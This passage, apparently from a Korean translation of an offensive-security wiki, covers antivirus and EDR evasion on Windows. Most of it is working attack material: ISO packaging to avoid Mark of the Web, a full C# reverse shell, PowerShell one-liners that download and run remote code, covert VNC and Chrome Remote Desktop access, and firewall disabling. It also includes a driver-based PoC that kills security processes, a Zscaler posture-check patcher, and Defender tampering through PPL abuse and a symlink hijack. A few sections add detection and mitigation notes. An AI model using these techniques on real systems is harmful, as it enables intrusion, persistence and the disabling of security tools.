SmartScreen은 주로 평판 기반 접근 방식을 사용합니다. 즉, 드물게 다운로드되는 애플리케이션은 SmartScreen을 유발하여 경고를 표시하고 최종 사용자가 파일을 실행하는 것을 방지합니다(그러나 파일은 여전히 More Info -> Run anyway를 클릭하면 실행할 수 있습니다).

**MoTW** (Mark of The Web)는 Zone.Identifier라는 이름의 [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)으로, 인터넷에서 파일을 다운로드할 때 해당 파일의 출처 URL과 함께 자동으로 생성됩니다.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>인터넷에서 다운로드한 파일의 Zone.Identifier ADS 확인.</p></figcaption></figure>

> [!TIP]
> 중요한 점은 **신뢰된** 서명 인증서로 서명된 실행 파일은 **SmartScreen을 트리거하지 않습니다**.

페이로드가 Mark of The Web을 받는 것을 방지하는 매우 효과적인 방법은 ISO와 같은 컨테이너 안에 패키징하는 것입니다. 이는 Mark-of-the-Web (MOTW)이 **비-NTFS** 볼륨에는 적용될 수 없기 때문입니다.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)은 페이로드를 출력 컨테이너에 패키징하여 Mark-of-the-Web을 회피하는 도구입니다.

예시 사용법:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW)는 애플리케이션과 시스템 구성요소가 **이벤트를 로깅**할 수 있게 해주는 강력한 Windows 로깅 메커니즘입니다. 그러나 보안 제품들이 악성 활동을 모니터링하고 탐지하는 데에도 사용될 수 있습니다.

AMSI가 비활성화(우회)되는 방식과 유사하게, 사용자 공간 프로세스의 **`EtwEventWrite`** 함수를 즉시 반환하도록 만들어 해당 프로세스에서 이벤트를 기록하지 못하게 하는 것도 가능합니다. 이는 메모리에서 함수를 패치하여 즉시 반환하게 만듦으로써 해당 프로세스의 ETW 로깅을 사실상 비활성화하는 방식입니다.

자세한 내용은 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**를 참고하세요.


## C# Assembly Reflection

메모리에서 C# 바이너리를 로드하는 방식은 오래전부터 알려져 왔으며, AV에 걸리지 않고 post-exploitation 도구를 실행하는 매우 좋은 방법입니다.

payload가 디스크에 저장되지 않고 직접 메모리에 로드되므로, 프로세스 전체에 대해 AMSI를 패치하는 것만 신경 쓰면 됩니다.

대부분의 C2 프레임워크(sliver, Covenant, metasploit, CobaltStrike, Havoc 등)는 이미 C# 어셈블리를 메모리에서 직접 실행하는 기능을 제공하지만, 이를 수행하는 방법은 여러 가지가 있습니다:

- **Fork\&Run**

새로운 희생 프로세스를 **생성(fork)하여 실행**한 다음, 그 새 프로세스에 post-exploitation 악성 코드를 주입하고 실행한 뒤 완료되면 해당 프로세스를 종료하는 방식입니다. 이 방법은 장점과 단점이 모두 있습니다. 장점은 실행이 우리의 Beacon implant 프로세스 **외부에서** 발생한다는 점으로, post-exploitation 동작 중 문제가 생기거나 탐지되더라도 **implant가 살아남을 가능성**이 훨씬 큽니다. 단점은 **행동 기반 탐지(Behavioural Detections)** 에 의해 탐지될 가능성이 더 높다는 점입니다.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

자기 자신의 프로세스에 post-exploitation 악성 코드를 **주입하는** 방식입니다. 이렇게 하면 새 프로세스를 생성해서 AV의 스캔 대상이 되지 않도록 피할 수 있지만, payload 실행 중 문제가 생기면 프로세스가 크래시되어 **beacon 손실** 가능성이 훨씬 커집니다.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly 로딩에 대해 더 읽고 싶다면 이 글을 참고하세요: [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 및 그들의 InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

PowerShell에서 C# Assemblies를 로드할 수도 있습니다. [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)와 [S3cur3th1sSh1t의 비디오](https://www.youtube.com/watch?v=oe11Q-3Akuk)를 확인하세요.

## Using Other Programming Languages

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)에서 제안된 것처럼, 공격자가 제어하는 SMB 공유에 설치된 인터프리터 환경에 손상된 머신이 접근할 수 있게 하면 다른 언어를 사용해 악성 코드를 실행할 수 있습니다.

SMB 공유에서 Interpreter Binaries와 환경에 대한 접근을 허용하면 손상된 머신의 메모리 내에서 해당 언어들로 **임의 코드를 실행**할 수 있습니다.

레포는 다음을 지적합니다: Defender는 스크립트를 여전히 스캔하지만 Go, Java, PHP 등을 이용하면 **정적 시그니처를 우회할 수 있는 유연성**이 더 커집니다. 이러한 언어들로 난독화되지 않은 랜덤 리버스 셸 스크립트를 테스트한 결과 성공적이었습니다.

## TokenStomping

Token stomping은 공격자가 **access token이나 EDR 또는 AV 같은 보안 제품의 토큰을 조작**하여 권한을 낮춤으로써 프로세스가 종료되지 않지만 악성 활동을 검사할 권한을 잃게 만드는 기술입니다.

이를 방지하려면 Windows가 보안 프로세스의 토큰에 대해 외부 프로세스가 핸들을 얻는 것을 **차단**할 수 있어야 합니다.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

[**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)에서 설명한 것처럼, 피해자의 PC에 Chrome Remote Desktop을 배포하고 이를 통해 원격 제어 및 지속성을 유지하는 것은 간단합니다:
1. https://remotedesktop.google.com/ 에서 다운로드하고 "Set up via SSH"를 클릭한 다음 Windows용 MSI 파일을 클릭하여 MSI 파일을 다운로드합니다.
2. 피해자 환경에서 무음 설치(관리자 권한 필요): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop 페이지로 돌아가서 다음을 클릭합니다. 마법사는 권한 부여를 요청할 것이며 계속하려면 Authorize 버튼을 클릭하세요.
4. 약간 수정한 파라미터로 제공된 명령을 실행합니다: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (GUI 없이 PIN을 설정할 수 있게 하는 pin 파라미터에 주의하세요).


## Advanced Evasion

Evasion은 매우 복잡한 주제이며, 하나의 시스템에서 여러 다른 텔레메트리 소스를 고려해야 할 때가 많아 성숙한 환경에서는 완전히 탐지되지 않는 상태를 유지하는 것이 사실상 불가능합니다.

각 환경은 저마다 강점과 약점을 가지고 있습니다.

더 고급 회피 기법에 대한 발판을 얻고 싶다면 [@ATTL4S](https://twitter.com/DaniLJ94)의 이 강연을 꼭 보시길 권합니다.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

이것은 또한 Evasion in Depth에 관한 [@mariuszbit](https://twitter.com/mariuszbit)의 훌륭한 강연입니다.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)를 사용하면 바이너리의 일부를 **제거**해가면서 어느 부분을 Defender가 악성으로 판단하는지 찾아서 분리해줍니다.\
동일한 기능을 제공하는 또 다른 도구는 [**avred**](https://github.com/dobin/avred)이며, 서비스는 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)에서 웹으로 제공됩니다.

### **Telnet Server**

Windows10 이전까지 모든 Windows에는 관리자 권한으로 설치할 수 있는 **Telnet server**가 포함되어 있었습니다. 설치하려면:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
시스템이 시작될 때 **시작**하도록 하고 지금 **실행**하세요:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet 포트 변경** (stealth) 및 firewall 비활성화:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (bin downloads를, setup이 아닌 것을 받으세요)

**ON THE HOST**: Execute _**winvnc.exe**_ and configure the server:

- 옵션 _Disable TrayIcon_ 를 활성화하세요
- _VNC Password_ 에 비밀번호를 설정하세요
- _View-Only Password_ 에 비밀번호를 설정하세요

Then, move the binary _**winvnc.exe**_ and **newly** created file _**UltraVNC.ini**_ inside the **victim**

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** 은닉을 유지하려면 다음을 하지 마세요

- 이미 실행 중이면 `winvnc`를 시작하지 마세요 — [popup](https://i.imgur.com/1SROTTl.png)가 발생합니다. 실행 여부는 `tasklist | findstr winvnc` 로 확인하세요
- 동일 디렉터리에 `UltraVNC.ini` 없이 `winvnc`를 시작하지 마세요 — [설정 창](https://i.imgur.com/rfMQWcf.png)이 열립니다
- 도움말을 보려고 `winvnc -h` 를 실행하지 마세요 — [popup](https://i.imgur.com/oc18wcu.png)가 발생합니다

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT 내부:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
이제 `msfconsole -r file.rc`로 **리스너를 시작**한 다음 **xml payload**를 **실행**하세요:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**현재 Defender는 프로세스를 매우 빠르게 종료할 것입니다.**

### 우리만의 reverse shell 컴파일하기

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 첫 번째 C# Revershell

다음 명령으로 컴파일:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
다음과 함께 사용:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# 컴파일러 사용
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

자동 다운로드 및 실행:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators 목록: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### python을 사용한 build injectors 예시:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 기타 도구
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – 커널 공간에서 AV/EDR 종료

Storm-2603은 소형 콘솔 유틸리티인 **Antivirus Terminator**를 활용해 랜섬웨어를 설치하기 전에 엔드포인트 보호를 비활성화했습니다. 이 도구는 **자체적으로 취약하지만 *signed* 된 드라이버**를 함께 배포하고 이를 악용해 Protected-Process-Light (PPL) AV 서비스조차 차단할 수 없는 권한 있는 커널 작업을 수행합니다.

핵심 포인트
1. **Signed driver**: 디스크에 배달되는 파일은 `ServiceMouse.sys`이지만 바이너리는 Antiy Labs의 “System In-Depth Analysis Toolkit”에 포함된 정식 서명된 드라이버 `AToolsKrnl64.sys`입니다. 드라이버가 유효한 Microsoft 서명을 가지고 있기 때문에 Driver-Signature-Enforcement (DSE)가 활성화된 상태에서도 로드됩니다.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
첫 번째 줄은 드라이버를 **커널 서비스**로 등록하고 두 번째 줄은 이를 시작하여 `\\.\ServiceMouse`가 사용자 영역에서 접근 가능하게 만듭니다.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
| `0x990000D0` | Delete an arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD는 사용자 모드 보호를 완전히 우회합니다; 커널에서 실행되는 코드는 *protected* 프로세스를 열거나 종료하거나 PPL/PP, ELAM 또는 기타 하드닝 기능에 관계없이 커널 객체를 조작할 수 있습니다.

Detection / Mitigation
•  Microsoft의 vulnerable-driver 블록 리스트(`HVCI`, `Smart App Control`)를 활성화하여 Windows가 `AToolsKrnl64.sys`의 로드를 거부하도록 합니다.  
•  새로운 *커널* 서비스 생성 감시 및 드라이버가 world-writable 디렉터리에서 로드되었거나 허용 목록에 없는 경우 알림을 설정합니다.  
•  사용자 모드에서 커스텀 디바이스 오브젝트에 대한 핸들 생성 후 의심스러운 `DeviceIoControl` 호출을 모니터링합니다.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler의 **Client Connector**는 로컬에서 device-posture 규칙을 적용하고 Windows RPC를 통해 그 결과를 다른 구성요소에 전달합니다. 두 가지 약한 설계 선택으로 인해 완전한 우회가 가능합니다:

1. Posture 평가가 **전적으로 클라이언트 측에서** 수행됩니다 (서버에는 boolean 값만 전송됨).  
2. 내부 RPC 엔드포인트는 연결하는 실행 파일이 **Zscaler에 의해 서명되었는지**(`WinVerifyTrust`를 통해)만 검증합니다.

디스크 상의 서명된 네 개 바이너리를 **패치함으로써** 두 메커니즘 모두 무력화할 수 있습니다:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Always returns `1` so every check is compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ any (even unsigned) process can bind to the RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Replaced by `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
원본 파일을 교체하고 서비스 스택을 재시작한 후:

* **모든** posture checks가 **green/compliant**로 표시됩니다.
* 서명되지 않았거나 수정된 바이너리가 named-pipe RPC endpoints(예: `\\RPC Control\\ZSATrayManager_talk_to_me`)를 열 수 있습니다.
* 침해된 호스트는 Zscaler 정책으로 정의된 내부 네트워크에 무제한으로 접근할 수 있게 됩니다.

이 사례 연구는 순수하게 클라이언트 측 신뢰 결정과 단순 서명 검사만으로도 몇 바이트의 패치로 우회될 수 있음을 보여줍니다.

## Protected Process Light (PPL)을 악용하여 AV/EDR을 LOLBINs로 변조하기

Protected Process Light (PPL)은 서명자/레벨 계층을 강제하여 동일하거나 더 높은 권한의 protected process만 서로를 변조할 수 있도록 합니다. 공격 관점에서, 합법적으로 PPL-enabled 바이너리를 실행하고 그 인수를 제어할 수 있다면, 로그 기록과 같은 정상적 기능을 AV/EDR에서 사용하는 보호된 디렉터리에 대한 제약된, PPL 기반의 쓰기 프리미티브로 전환할 수 있습니다.

What makes a process run as PPL
- 대상 EXE(및 로드된 DLL)는 PPL-capable EKU로 서명되어 있어야 합니다.
- 프로세스는 CreateProcess로 생성되어야 하며 다음 플래그를 사용해야 합니다: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- 바이너리의 서명자와 일치하는 호환 가능한 protection level을 요청해야 합니다(예: anti-malware 서명자에는 `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows 서명자에는 `PROTECTION_LEVEL_WINDOWS`). 잘못된 레벨을 사용하면 생성이 실패합니다.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (프로텍션 레벨을 선택하고 인수를 대상 EXE로 전달함):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- 사용 패턴:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- 서명된 시스템 바이너리 `C:\Windows\System32\ClipUp.exe`는 자체적으로 프로세스를 생성하고 호출자가 지정한 경로에 로그 파일을 쓰도록 하는 인자를 받습니다.
- PPL 프로세스로 실행될 때, 파일 쓰기는 PPL 보호 하에서 이루어집니다.
- ClipUp는 공백이 포함된 경로를 파싱할 수 없습니다; 일반적으로 보호된 위치를 가리킬 때는 8.3 short paths를 사용하세요.

8.3 short path helpers
- 짧은 이름 나열: 각 상위 디렉터리에서 `dir /x`
- cmd에서 단축 경로 유도: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) PPL-capable LOLBIN(ClipUp)을 `CREATE_PROTECTED_PROCESS`로 실행합니다. 실행기는 예를 들어 CreateProcessAsPPL을 사용합니다.
2) ClipUp 로그 경로 인자를 전달하여 보호된 AV 디렉터리(예: Defender Platform)에 파일 생성이 일어나도록 강제합니다. 필요하면 8.3 단축 이름을 사용하세요.
3) 대상 바이너리가 실행 중 AV에 의해 일반적으로 열려 있거나 잠겨 있다면(예: MsMpEng.exe), AV가 시작되기 전에 부팅 시에 쓰기가 되도록 더 일찍 실행되는 자동 시작 서비스를 설치하여 스케줄링하세요. 부팅 순서는 Process Monitor(boot logging)로 검증하세요.
4) 재부팅 시 PPL 보호 하에서의 쓰기가 AV가 바이너리를 잠그기 전에 발생하여 대상 파일을 손상시키고 시작을 방해합니다.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- ClipUp가 작성하는 내용은 위치(placement) 외에는 제어할 수 없습니다; 이 primitive는 정밀한 콘텐츠 삽입보다는 손상(corruption)에 적합합니다.
- local admin/SYSTEM 권한이 필요하며 service를 설치/시작하고 재부팅할 수 있는 시간이 필요합니다.
- 타이밍이 중요합니다: 대상 파일이 열려있으면 안 됩니다; 부팅 시점 실행은 파일 잠금 문제를 회피합니다.

Detections
- 부팅 시점에 parent가 비표준 런처인 경우를 포함해 비정상적인 인수로 `ClipUp.exe` 프로세스가 생성되는 행위.
- 자동 시작으로 설정된 의심스러운 바이너리를 가리키는 새로운 서비스 생성 및 Defender/AV보다 항상 먼저 시작되는 사례. Defender 시작 실패 전후의 서비스 생성/수정 기록을 조사하세요.
- Defender 바이너리/Platform 디렉터리에 대한 파일 무결성 모니터링; protected-process 플래그를 가진 프로세스에 의해 예기치 않은 파일 생성/수정이 발생하는지 확인.
- ETW/EDR 텔레메트리: `CREATE_PROTECTED_PROCESS`로 프로세스가 생성되었거나 비-AV 바이너리에서 비정상적인 PPL 수준 사용이 감지되는지 확인.

Mitigations
- WDAC/Code Integrity: 어떤 서명된 바이너리가 PPL로 실행될 수 있고 어떤 부모 프로세스 하에서 허용되는지 제한; 정당한 컨텍스트 외에서의 ClipUp 호출을 차단.
- 서비스 관리: 자동 시작 서비스의 생성/수정 권한을 제한하고 start-order 조작을 모니터링.
- Defender tamper protection 및 early-launch protections가 활성화되어 있는지 확인; 바이너리 손상을 나타내는 시작 오류를 조사.
- 환경 호환성이 확인되면 보안 툴이 호스팅되는 볼륨에서 8.3 short-name generation 비활성화를 고려(철저한 테스트 필요).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender는 다음 경로의 하위 폴더를 나열하여 자신이 실행할 platform을 선택합니다:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

가장 높은 사전식(lexicographic) 버전 문자열(예: `4.18.25070.5-0`)을 가진 하위 폴더를 선택한 후 그 위치에서 Defender 서비스 프로세스를 시작(서비스/레지스트리 경로도 갱신)합니다. 이 선택은 디렉터리 엔트리(디렉터리 reparse point 포함, 예: symlink)를 신뢰합니다. 관리자는 이를 이용해 Defender가 공격자가 쓸 수 있는 경로를 가리키도록 리다이렉트하고 DLL sideloading 또는 서비스 중단을 달성할 수 있습니다.

Preconditions
- Local Administrator 권한(Platform 폴더 아래에 디렉터리/심링크를 생성하기 위해 필요)
- 재부팅하거나 Defender platform 재선택을 트리거할 수 있는 능력(service가 부팅 시 재시작되는 경우)
- 내장 도구만으로 가능(mklink)

Why it works
- Defender는 자체 폴더 내 쓰기를 차단하지만, platform 선택은 디렉터리 엔트리를 신뢰하며 대상이 보호/신뢰된 경로로 해석되는지 검증하지 않고 사전식으로 가장 높은 버전을 선택합니다.

Step-by-step (example)
1) 현재 platform 폴더의 쓰기 가능한 클론을 준비합니다(예: `C:\TMP\AV`):
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 내부에 상위 버전 디렉터리 symlink를 생성하여 당신의 folder를 가리키게 하세요:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) 트리거 선택 (재부팅 권장):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend)가 리디렉션된 경로에서 실행되는지 확인:
